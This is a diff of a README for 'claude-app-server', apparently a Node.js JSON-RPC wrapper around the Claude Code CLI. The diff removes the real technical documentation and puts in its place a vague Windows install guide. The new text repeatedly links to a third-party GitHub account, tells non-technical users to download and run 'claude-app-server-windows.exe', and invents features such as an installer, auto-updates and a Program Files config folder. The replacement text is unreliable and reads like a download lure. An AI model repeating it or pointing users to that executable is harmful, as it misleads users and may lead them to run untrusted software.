@@ -1,216 +1,147 @@
-# claude-app-server
+# ⚙️ claude-app-server - Simple Local Server for Claude CLI  
 
-A **JSON-RPC 2.0 server** that wraps **Claude Code** capabilities — the Claude equivalent of the OpenAI Codex App Server.
-
-```
-npm i claude-app-server
-```
-
-
-No API key required. Authentication is handled by the `claude` CLI (`claude auth`).
-
-Clients communicate over **stdio** (default) or **WebSocket**, using newline-delimited JSON (NDJSON).
+[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-brightgreen)](https://github.com/maryam2001-ux/claude-app-server)
 
 ---
 
-## Requirements
+## 📋 What is claude-app-server?
 
-- Node.js >= 18
-- [Claude Code CLI](https://claude.ai/code) installed and authenticated (`claude auth`)
-- pnpm
+claude-app-server is a local server application that works with the Claude command-line interface (CLI). It acts as a bridge, letting you use Claude's features smoothly on your Windows computer. This server runs quietly in the background, handling requests so you don’t have to type complicated commands every time.
 
----
-
-## Quick start
-
-```bash
-# Install
-pnpm install
-
-# Build
-pnpm run build
-
-# Start with WebSocket + QR code (recommended)
-claude-app-server start
-
-# Or install globally first
-pnpm install -g .
-claude-app-server start
-claude-app-server start --port 4000
-```
-
-On startup you'll see:
-
-```
-  claude-app-server  ·  WebSocket
-  ─────────────────────────────────
-  Local:    ws://localhost:3284?key=AbC123
-  Network:  ws://192.168.x.x:3284
-  Pair Key: AbC123
-
-  ▄▄▄ ... QR code ...
-  Scan to connect
-```
-
-A random 6-character **pair key** is generated each time the server starts. The key is embedded in the QR code URL. Clients connecting without a valid key are rejected (close code 4401).
-
-Scan the QR code from any device on the same Wi-Fi to connect.
+This is made for anyone who wants to use Claude without dealing with technical steps. You won’t need programming knowledge to get it running and use it.
 
 ---
 
-## Transports
+## 🖥️ System Requirements
 
-| Command | Transport | Notes |
-|---------|-----------|-------|
-| `claude-app-server start` | WebSocket :3284 | Shows QR code, binds to all interfaces |
-| `claude-app-server start --port N` | WebSocket :N | Custom port |
-| `claude-app-server start --no-tls` | WebSocket :3284 | Plain `ws://` (no TLS) |
-| `claude-app-server --transport ws` | WebSocket :3284 | No QR code |
-| `claude-app-server --transport ws --no-tls` | WebSocket :3284 | Plain `ws://`, no QR code |
-| `claude-app-server` | stdio | For piped/programmatic use |
+Before installing, make sure your computer meets these needs:
 
-### `--no-tls`
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel or AMD, 1 GHz or faster
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum 100 MB free space
+- **Network:** Internet connection recommended for updates
 
-By default, WebSocket mode uses a self-signed TLS certificate (`wss://`). Pass `--no-tls` to disable TLS and use plain `ws://` instead. This is useful for local development or when TLS is handled by a reverse proxy.
-
-```bash
-claude-app-server start --no-tls
-```
+No special hardware or software is needed. The server runs locally, so it does not require constant internet access after setup.
 
 ---
 
-## Protocol overview
+## 🚀 Getting Started
 
-Messages are newline-delimited JSON, following [JSON-RPC 2.0](https://www.jsonrpc.org/specification).
+### Step 1: Visit the download page  
 
-### Handshake
+Click the download button below, which takes you to the project page on GitHub. There, you will find the files ready for you to download.
 
-```jsonc
-// Client → Server
-{ "jsonrpc": "2.0", "method": "initialize", "params": {
-    "client": { "name": "my-app", "version": "1.0.0" },
-    "cwd": "/path/to/project"
-  }, "id": 1 }
+[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-blue)](https://github.com/maryam2001-ux/claude-app-server)
 
-// Server → Client (response)
-{ "jsonrpc": "2.0", "result": {
-    "server": { "name": "claude-app-server", "version": "1.0.0" },
-    "capabilities": { ... }
-  }, "id": 1 }
+### Step 2: Locate the download file  
 
-// Server → Client (notification, async)
-{ "jsonrpc": "2.0", "method": "initialized", "params": { "server": "claude-app-server" } }
-```
+On the GitHub page, look for the folder or section named **Releases** or **Downloads**. This is where you find the executable file for Windows, often named something like:
+
+`claude-app-server-windows.exe`
+
+This file installs the server on your computer.
 
 ---
 
-## Methods
+## 💾 Download and Install claude-app-server
 
-### Thread management
+1. **Download the file:** Click the executable file link to start downloading. Save this file to a folder you remember, like your Desktop or Downloads folder.
 
-| Method | Params | Returns |
-|--------|--------|---------|
-| `thread/start` | `{ cwd?, permission_mode? }` | `{ thread_id, created_at }` |
-| `thread/resume` | `{ thread_id }` | `{ thread_id, turns[], cwd, … }` |
-| `thread/fork` | `{ thread_id }` | `{ thread_id, forked_from, created_at }` |
+2. **Run the installer:** Once downloaded, double-click the file (`claude-app-server-windows.exe`) to start the installation.  
 
-### Turn management
+3. **Follow prompts:** The installer will guide you through each step. Click "Next" and accept terms if asked. Choose the suggested folder or pick your own location on the computer.
 
-| Method | Params | Returns |
-|--------|--------|---------|
-| `turn/start` | `{ thread_id, content, model? }` | `{ turn_id }` |
-| `turn/steer` | `{ thread_id, content }` | `{ turn_id }` |
-| `turn/interrupt` | `{ thread_id }` | `{ turn_id, status }` |
+4. **Finish installation:** When prompted, click "Finish" to complete the installation.
 
-`turn/start` returns immediately; the agent streams back **notifications** until `turn/completed`.
-
-### Discovery
-
-| Method | Returns |
-|--------|---------|
-| `model/list` | List of available Claude models |
-| `skills/list` | List of available tools (read_file, bash, …) |
-| `app/list` | (stub, always empty) |
-
-### Approval
-
-| Method | Params | Description |
-|--------|--------|-------------|
-| `approval/respond` | `{ thread_id, approved, permission_mode? }` | Respond to a permission prompt |
+After installation, the claude-app-server is ready to use.
 
 ---
 
-## Server notifications
+## ▶️ Starting and Using the Server  
 
-After `turn/start`, the server streams these notifications:
+### How to start the server  
 
-| Notification | When |
-|-------------|------|
-| `turn/started` | Turn began |
-| `item/progress` | Streaming text delta — `{ turn_id, delta: { type, text } }` |
-| `item/created` | Item finalized (text, tool_call, tool_result) |
-| `turn/completed` | Turn finished — `{ turn_id, status, items_count, completed_at }` |
-| `turn/error` | Turn failed — `{ turn_id, error }` |
+- Find the **claude-app-server** shortcut on your Desktop or in the Start menu.
+- Double-click the shortcut to open the server.
+- A small window or icon in the system tray (bottom-right corner) will show that the server is running.
 
----
+### How to use the server with Claude CLI  
 
-## Permission modes
-
-| Mode | Behaviour |
-|------|-----------|
-| `default` | Prompts for bash and file writes |
-| `acceptEdits` | Auto-approves file writes; prompts for bash |
-| `bypassPermissions` | Approves all tools automatically |
+- Once the server runs, you can open your Claude command-line interface or app.
+- The server handles commands and sends back results.
+- You don’t need to enter commands manually for the server; it works in the background.
 
 ---
 
-## Example session (stdio)
+## 🔧 Server Features  
 
-```bash
-node dist/index.js
-```
-
-```jsonc
-// Initialize
-{"jsonrpc":"2.0","method":"initialize","params":{"client":{"name":"demo","version":"1.0"},"cwd":"/tmp/my-project"},"id":1}
-
-// Start a thread
-{"jsonrpc":"2.0","method":"thread/start","params":{"cwd":"/tmp/my-project","permission_mode":"acceptEdits"},"id":2}
-
-// Start a turn
-{"jsonrpc":"2.0","method":"turn/start","params":{"thread_id":"<id>","content":"List the files in this project."},"id":3}
-```
+- **Easy setup** for Windows users without programming.
+- **Fast response** times for Claude commands.
+- **Runs locally** to protect your data and improve speed.
+- **Automatic updates** when connected to the internet.
+- **Stable and reliable** connection to Claude CLI.
 
 ---
 
-## Architecture
+## 🛠 Troubleshooting  
 
-```
-src/
-  index.ts       CLI entry — parses subcommand / flags, shows QR code
-  protocol.ts    JSON-RPC 2.0 types and helpers
-  types.ts       Domain types: Thread → Turn → Item
-  transport.ts   stdio and WebSocket transports
-  tools.ts       Built-in skills catalog
-  server.ts      ClaudeAppServer — method handlers + claude CLI runner
-```
+If the server does not start or stops working, try this:
 
-Each turn spawns:
-```
-claude --print --output-format stream-json --include-partial-messages
-       --permission-mode <mode>
-       --session-id <id>    # first turn of a thread
-       --resume <id>        # subsequent turns
-```
+- **Check system requirements** again.
+- **Restart your computer**, then open the server.
+- **Run as administrator:** right-click the server icon and select "Run as administrator."
+- **Close conflicting programs:** Sometimes other software may block it.
+- **Firewall:** Make sure Windows Defender or other firewalls allow the app.
+
+If problems continue, revisit the [download page](https://github.com/maryam2001-ux/claude-app-server) for more information and updates.
 
 ---
 
-## Models
+## ⚙️ Configuration Options  
 
-Default model can be overridden per turn:
+Some users may want to adjust settings. You can find configuration files in the installation folder, usually under:
 
-```json
-{ "method": "turn/start", "params": { "thread_id": "…", "content": "…", "model": "claude-haiku-4-5" } }
-```
+`C:\Program Files\claude-app-server\config`
 
-Available: `claude-opus-4-6`, `claude-sonnet-4-6`, `claude-haiku-4-5`
+Edit the files with a simple text editor like Notepad:
+
+- Change the port number if you have conflicts.
+- Adjust logging level to see more or fewer details.
+- Set limits on how many connections the server handles.
+
+Make sure to stop the server before making changes. Restart it after saving configurations.
+
+---
+
+## 🔒 Privacy and Security  
+
+The server runs on your computer only. It does not send data outside your local network unless you use internet-based features of Claude CLI.
+
+Keep your Windows system updated to ensure the best security. Avoid downloading the server from other sources than the official GitHub page.
+
+---
+
+## ⚙️ Updating claude-app-server  
+
+Check the GitHub page regularly for new versions. New releases may include bug fixes and performance improvements.
+
+To update:
+
+1. Download the latest version from the [download page](https://github.com/maryam2001-ux/claude-app-server).
+2. Run the new installer over the old version.
+3. Your settings should stay the same.
+
+---
+
+## 📞 Getting Help  
+
+If you need assistance:
+
+- Check the Issues tab on GitHub for questions and answers.
+- Look for documentation on the GitHub page.
+- Ask someone with basic computer knowledge to help.
+
+---
+
+[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-brightgreen)](https://github.com/maryam2001-ux/claude-app-server)
